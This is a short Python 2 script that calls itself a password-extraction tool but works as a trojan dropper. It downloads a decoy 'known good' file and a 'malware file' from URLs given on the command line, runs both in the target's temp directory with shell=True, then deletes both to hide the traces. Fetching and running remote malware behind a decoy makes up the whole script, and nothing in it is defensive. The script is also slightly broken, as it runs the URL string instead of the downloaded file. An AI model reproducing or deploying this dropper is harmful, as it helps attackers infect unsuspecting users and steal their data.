#! /usr/bin/python
"""A simple script used to extract passwords from a target host.
   Uses Python 2.7.16"""

import subprocess
import optparse
import requests                             # version 2.5.1 required
import tempfile
import os


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-g', '--good', dest='good', help='Link to known good file.')
    parser.add_option('-m', '--malware', dest='malware', help='Link to malware file to embed in known good file.')

    (options, arguments) = parser.parse_args()

    return options


def download(url):
    """Obtains a document from the Internet to use as a trojan carrier file."""
    get_response = requests.get(url)

    file_name = url.split('/')[-1]

    with open(file_name, 'wb') as out_file:
        """Writes output to file on local disk"""
        out_file.write(get_response.content)


options = get_arguments()

temp_directory = tempfile.gettempdir()      # finds temp directory on target system
os.chdir(temp_directory)                    # changes to temp directory

# known good file
download(options.good)
subprocess.Popen(options.good, shell=True)

# malware file
download(options.malware)
subprocess.call(options.malware, shell=True)

# remove files
os.remove(options.good)
os.remove(options.malware)
